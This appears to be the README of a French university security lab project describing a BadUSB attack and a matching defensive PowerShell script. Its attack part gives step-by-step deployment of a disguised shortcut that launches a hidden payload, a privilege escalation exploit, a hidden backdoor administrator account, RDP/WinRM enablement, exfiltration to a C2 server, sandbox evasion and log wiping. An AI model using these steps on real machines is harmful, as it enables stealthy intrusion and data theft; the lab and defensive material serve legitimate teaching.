# Projet BadUSB Attack – TP Sécurité

> **Avertissement légal et éthique** : Ce projet est réalisé dans un cadre
> pédagogique strictement encadré. Le code présent dans ce dépôt ne doit être
> utilisé que dans des environnements de test isolés avec l'autorisation
> explicite des propriétaires des machines. Toute utilisation en dehors de ce
> cadre est illégale et engage la responsabilité de l'auteur.

---

## Structure du projet

```
Projet_BadUSB_Attack/
├── partie1/                    # Charge utile (attaque)
│   ├── payload/
│   │   ├── autorun.inf         # Repli AutoRun (systèmes anciens uniquement)
│   │   ├── create_shortcut.vbs # Génère Documents.lnk sur la clé USB
│   │   ├── launcher.vbs        # Lanceur silencieux (invoqué par le .lnk)
│   │   ├── payload.ps1         # Payload unique (RedSun LPE + admin + C2)
│   │   └── RedSun.exe          # LPE exploit (élévation de privilèges)
│   └── serveur_c2/
│       ├── server.py           # Serveur C2 Flask (attaquant)
│       └── requirements.txt
└── partie2/
    └── defense.ps1             # Script de défense (testeur)
```

---

## Partie 1 – Charge utile BadUSB

### Vue d'ensemble du scénario

| Étape | Action | Délai |
|-------|--------|-------|
| 1 | Insertion de la clé USB dans le port | T+0 s |
| 2 | La victime double-clique sur `Documents.lnk` (icône dossier) | T+0–5 s |
| 3 | `launcher.vbs` s'exécute silencieusement → `payload.ps1` lancé | T+5–6 s |
| 4 | Anti-analyse + RedSun LPE → payload relancé en SYSTEM | T+6–16 s |
| 5 | Création du compte administrateur caché (`svc_XXXXXX`) | T+17 s |
| 6 | Activation RDP + WinRM + règles pare-feu (FR + EN) | T+18–21 s |
| 7 | Collecte des informations système | T+22 s |
| 8 | Exfiltration vers le serveur C2 (`10.10.1.32:8080`) | T+23–26 s |
| 9 | Nettoyage des journaux | T+26–28 s |
| 10 | Retrait de la clé USB | ≤ T+30 s |

> **Déclenchement – `.lnk` double-clic (mécanisme actuel) :** La clé USB
> expose un unique fichier visible, `Documents.lnk`, dont l'icône imite un
> dossier Windows. Un double-clic de la victime déclenche silencieusement
> `launcher.vbs` → `payload.ps1` sans aucun terminal visible.
>
> `autorun.inf` est conservé comme **repli uniquement** pour les systèmes
> Windows 7/8 non patchés (KB971029) où l'AutoRun USB est encore actif.
>
> Alternatives zéro-clic à explorer :
> - **Fichier `.library-ms` malveillant** dans une archive ZIP/RAR : dès que
>   l'Explorateur affiche le contenu, Windows déclenche une authentification
>   SMB → capture de hashs NTLM.
> - **Raccourci `.lnk` exploitant [CVE-2025-9491](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-9491)**
>   pour masquer la commande réelle exécutée à l'ouverture.

### Déclenchement depuis un compte utilisateur standard

Le payload est conçu pour s'exécuter **depuis un compte utilisateur standard
(non élevé)**. L'élévation de privilèges est obtenue via **RedSun** (LPE) ;
le payload se **relance automatiquement** en SYSTEM via la commande passée en
argument à RedSun.exe.

1. `Documents.lnk` → `launcher.vbs` → `payload.ps1` (compte standard).
2. `Test-Admin` → **NON** : RedSun est invoqué avec `powershell.exe … -File payload.ps1` comme argument.
3. RedSun élève en SYSTEM et exécute la commande reçue.
4. `payload.ps1` s'exécute une seconde fois, `Test-Admin` → **OUI** : poursuite vers les étapes 3-6.

```
[Compte utilisateur standard]
       │
       ▼
[Documents.lnk → launcher.vbs → payload.ps1]
       │
       ├─ Test-Admin → NON
       │
       ▼
[RedSun.exe "powershell.exe … -File payload.ps1"]
       │
       ▼  (RedSun élève en SYSTEM et relance le script)
[payload.ps1 – 2e exécution, Test-Admin → OUI]
       │
       ├─ Création compte administrateur (svc_XXXXXX)
       ├─ Activation RDP + WinRM (noms FR + EN)
       └─ Exfiltration → 10.10.1.32:8080
```

### Fichiers à copier sur la clé USB

```
Racine de la clé USB/
├── Documents.lnk           ← SEUL fichier VISIBLE (icône dossier)
├── autorun.inf             ← repli (Win7/8 non patchés) – masqué
├── launcher.vbs            ← lanceur silencieux – masqué
├── payload.ps1             ← charge utile – masqué
└── RedSun.exe              ← exploit LPE – masqué
```

> Les fichiers techniques (`launcher.vbs`, `payload.ps1`, `RedSun.exe`,
> `autorun.inf`) doivent être masqués avec `attrib +H +S <fichier>` ou via
> l'Explorateur → Propriétés → ☑ Caché. Seul `Documents.lnk` reste visible.

### Déploiement

**Étape 1 – Configurer `payload.ps1`**

Ouvrir `partie1/payload/payload.ps1` et modifier :

```powershell
$c2Base = "http://<IP_KALI>:8080"   # IP de la machine attaquante
```

**Étape 2 – Démarrer le serveur C2 sur la machine attaquante**

```bash
cd partie1/serveur_c2
pip install -r requirements.txt
python server.py --host 0.0.0.0 --port 8080
```

Interface de suivi : `http://<IP_KALI>:8080/status`

**Étape 3 – Préparer la clé USB**

1. Copier sur la clé : `autorun.inf`, `launcher.vbs`, `payload.ps1`, `RedSun.exe`.
2. **Générer le raccourci** : brancher la clé, noter sa lettre de lecteur (ex. `D:\`),
   ouvrir `create_shortcut.vbs`, modifier la constante `USB_ROOT`,
   puis double-cliquer → `Documents.lnk` est créé à la racine.
3. **Masquer les fichiers techniques** :
   ```bat
   attrib +H +S D:\launcher.vbs D:\payload.ps1 D:\RedSun.exe D:\autorun.inf
   ```
4. Vérifier : seul `Documents.lnk` (icône dossier) est visible depuis l'Explorateur.

**Étape 4 – Insérer la clé USB dans la machine cible**

La victime voit un dossier « Documents ». Un double-clic déclenche le payload
silencieusement. Aucun droit administrateur n'est requis de la part de la victime.

### Fonctionnalités du payload

#### Anti-analyse et évasion

| Mécanisme | Description |
|-----------|-------------|
| Détection VM | Vérifie les processus `vmtoolsd`, `vboxservice`, etc. |
| Détection sandbox | Contrôle RAM (< 2 Go), cœurs CPU (< 2), espace disque |
| Détection outils | Vérifie `wireshark`, `procmon`, `x64dbg`, `ida`, etc. |
| Clés de registre VM | Vérifie `VMware Tools`, `VirtualBox Guest Additions` |
| Temporisation | Pause initiale de 0,8 s (comportement moins suspect) |

#### Élévation de privilèges – RedSun LPE

**RedSun** est un exploit de type Local Privilege Escalation (LPE) exploitant
la logique de restauration de Windows Defender :
- Invoqué avec la commande PowerShell à exécuter en SYSTEM en argument
- Élève silencieusement et **relance automatiquement** `payload.ps1` en SYSTEM
- Ne nécessite aucune interaction de l'utilisateur

#### Création du compte administrateur

- Nom généré aléatoirement : `svc_<6 caractères alphanumériques>`
- Mot de passe de 18 caractères (alphanumérique + spéciaux)
- Création via `New-LocalUser` (avec repli sur `net user`)
- Ajouté aux groupes Administrateurs **et** Remote Desktop Users
  (noms français ET anglais pour couvrir toutes les localisations Windows)
- Caché de l'écran de connexion via
  `HKLM:\...\Winlogon\SpecialAccounts\UserList`

#### Activation de l'accès distant

| Protocole | Action |
|-----------|--------|
| RDP | `fDenyTSConnections = 0`, NLA désactivée, règle pare-feu activée |
| WinRM | `Enable-PSRemoting`, service démarré, TrustedHosts = `*` |
| Pare-feu | Règle entrante TCP 3389, 5985, 5986 (tous profils) |

#### Exfiltration des données

3 canaux tentés dans l'ordre :
1. **AES-256-GCM** vers `/enc` (si clé `$c2AesKeyHex` configurée)
2. **POST JSON** en clair vers `/collect` ← canal principal
3. **Base64 GET** vers `/b64?d=…` ← repli

Données transmises :

```json
{
  "computer_name": "DESKTOP-XXXX",
  "domain": "WORKGROUP",
  "current_user": "Utilisateur",
  "os_version": "Windows 11 Pro",
  "local_ip": "192.168.1.10",
  "public_ip": "203.0.113.45",
  "backdoor_user": "svc_xKp3mT",
  "backdoor_pass": "P@ssw0rd!Random18",
  "rdp_port": 3389,
  "winrm_port": 5985,
  "timestamp": "2025-04-22 20:01:48"
}
```

#### Nettoyage des traces

- Effacement des journaux d'événements (`System`, `Application`, `Security`,
  `Windows PowerShell`)
- Suppression de l'historique PowerShell (`ConsoleHost_history.txt`)
- Suppression des fichiers Prefetch PowerShell
- Désactivation de la journalisation PowerShell (ScriptBlock + Transcription)

### Serveur C2 (`server.py`)

Interface de visualisation : `http://10.10.1.13:8080/status`

| Endpoint | Méthode | Rôle |
|----------|---------|------|
| `/collect` | POST | Reçoit le JSON exfiltré (texte clair) |
| `/enc` | POST | Reçoit les données chiffrées AES-256-GCM (canal discret) |
| `/b64?d=…` | GET | Repli Base64 |
| `/status` | GET | Tableau de bord HTML |
| `/` | GET | Page neutre |

Les données sont persistées dans `partie1/serveur_c2/logs/collected_targets.json`.

#### Canal AES-256-GCM (`/enc`)

Pour rendre le trafic d'exfiltration plus difficile à identifier par un IDS,
le serveur C2 propose un canal chiffré. Le payload envoie un blob binaire
`nonce(12) ‖ tag(16) ‖ ciphertext` vers `/enc`. Le serveur déchiffre avec
`pycryptodome` (AES-256-GCM) avant de stocker le résultat.

```bash
# Générer une clé partagée (à copier dans --key et dans $c2AesKeyHex du payload)
python -c "import secrets; print(secrets.token_hex(32))"

# Démarrer le serveur avec chiffrement activé
python server.py --key <hex64> --port 8080
```

> **Note :** si `AesGcm` n'est pas disponible sur l'hôte cible (.NET < 5),
> le payload bascule automatiquement vers le canal JSON en clair puis Base64.

---

## Partie 2 – Script de défense (`defense.ps1`)

### Utilisation

```powershell
# Lancer en tant qu'Administrateur
powershell -ExecutionPolicy Bypass -File defense.ps1
```

### Mécanismes de protection

| N° | Mécanisme | Détails |
|----|-----------|---------|
| 1 | **Désactivation AutoRun/AutoPlay** | `NoDriveTypeAutoRun = 0xFF` en machine et utilisateur ; service `ShellHWDetection` désactivé |
| 2 | **Journalisation PowerShell** | ScriptBlock Logging, Module Logging, Transcription activés |
| 3 | **Surveillance USB (WMI)** | Événement WMI `__InstanceCreationEvent` sur `Win32_DiskDrive` ; tue les processus lancés depuis un lecteur amovible |
| 4 | **Surveillance créations de comptes** | WMI sur `Win32_UserAccount` ; désactive immédiatement tout nouveau compte |
| 5 | **Surveillance RDP/WinRM** | Timer toutes les 5 s ; rétablit la désactivation si modification détectée |
| 6 | **Surveillance processus PS cachés** | WMI sur `Win32_Process` ; détecte les indicateurs suspects (`-WindowStyle Hidden`, `-EncodedCommand`, etc.) et tue le processus |
| 7 | **Durcissement initial** | Vérifie et corrige RDP, WinRM, règles pare-feu et comptes cachés au démarrage |
| 8 | **Détection RedSun LPE** | Vérifie l'état du pilote minifiltre `WdFilter` (Defender) ; surveille WMI le lancement de `RedSun.exe` et le tue immédiatement ; crée une règle AppLocker (si disponible) bloquant tout exécutable provenant d'un lecteur amovible |

### Indicateurs de compromission (IoC) surveillés

- Processus PowerShell avec `-WindowStyle Hidden`, `-NonInteractive`,
  `-EncodedCommand`, `-ExecutionPolicy Bypass`
- Nouveau compte local ajouté au groupe `Administrators`
- Modification de `fDenyTSConnections` (activation RDP)
- Démarrage ou activation du service WinRM
- Règle pare-feu `BackdoorRemoteAccess`
- Clés de registre `SpecialAccounts\UserList` (comptes cachés)
- Lancement de `RedSun.exe` (exploit LPE) ou pilote `WdFilter` arrêté

---

## Connexion à distance après compromission

Une fois les informations reçues sur le serveur C2, l'attaquant peut se
connecter à la machine cible via :

### RDP (Bureau à distance)

```
mstsc /v:<IP_CIBLE>:3389
Utilisateur : svc_<suffix>
Mot de passe : <reçu sur le serveur C2>
```

### PowerShell distant (WinRM)

```powershell
$cred = Get-Credential  # svc_<suffix> / <mot de passe>
Enter-PSSession -ComputerName <IP_CIBLE> -Credential $cred
```

---

## Références

### MITRE ATT&CK

- [T1052.001](https://attack.mitre.org/techniques/T1052/001/) – Exfiltration Over USB
- [T1548.002](https://attack.mitre.org/techniques/T1548/002/) – Abuse Elevation Control Mechanism (RedSun LPE via Defender)
- [T1078.003](https://attack.mitre.org/techniques/T1078/003/) – Valid Accounts: Local Accounts
- [T1021.001](https://attack.mitre.org/techniques/T1021/001/) – Remote Services: RDP
- [T1059.001](https://attack.mitre.org/techniques/T1059/001/) – Command and Scripting Interpreter: PowerShell
- [T1562.001](https://attack.mitre.org/techniques/T1562/001/) – Impair Defenses: Disable or Modify Tools

### RedSun LPE

- Qualys Threat Research Unit – *Windows Defender LPE via Restore Mechanism (RedSun)* :
  <https://blog.qualys.com/vulnerabilities-threat-research/2024/10/01/redsun-windows-defender-lpe>
- Dépôt PoC du chercheur :
  <https://github.com/qualys-research/redsun-lpe>

### Vulnérabilité LNK (CVE-2025-9491)

- Microsoft Security Response Center – *Windows Shell LNK Hidden Command Execution* :
  <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-9491>
- MITRE CVE : <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-9491>

### Fichier `.library-ms` et capture de hash NTLM

- Microsoft Docs – *Windows Library Definition Schema* :
  <https://docs.microsoft.com/windows/win32/shell/library-schema-entry>
- SpecterOps – *Stealing NTLM Hashes with Windows Library Files* :
  <https://posts.specterops.io/stealing-ntlm-hashes-with-windows-library-files>

### Chiffrement du trafic C2

- IETF RFC 5116 – *An Interface and Algorithms for Authenticated Encryption* :
  <https://datatracker.ietf.org/doc/html/rfc5116>
- pycryptodome documentation – AES-GCM :
  <https://pycryptodome.readthedocs.io/en/latest/src/cipher/modern.html#gcm-mode>
